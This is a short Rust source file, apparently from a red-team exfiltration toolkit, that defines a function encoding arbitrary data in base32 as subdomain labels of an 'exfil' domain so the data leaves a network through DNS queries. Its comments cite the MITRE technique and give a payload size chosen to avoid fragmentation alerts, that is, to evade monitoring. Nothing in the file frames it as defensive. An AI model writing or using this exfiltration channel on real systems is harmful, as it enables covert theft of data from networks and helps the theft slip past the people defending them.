// exfil-channels/src/dns_exfil.rs
// MITRE ATT&CK T1048 (Exfiltration Over Alternative Protocol)
// Encoding: base32hex + subdomain labels
// Max safe payload per query: ~200 bytes (avoid fragmentation alerts)

fn exfil_dns(data: &[u8]) -> String {
    let encoded = base32::encode(base32::Alphabet::RFC4648 { padding: false }, data);
    format!("{}.exfil.ncdd-no.internal", encoded.to_lowercase())
}
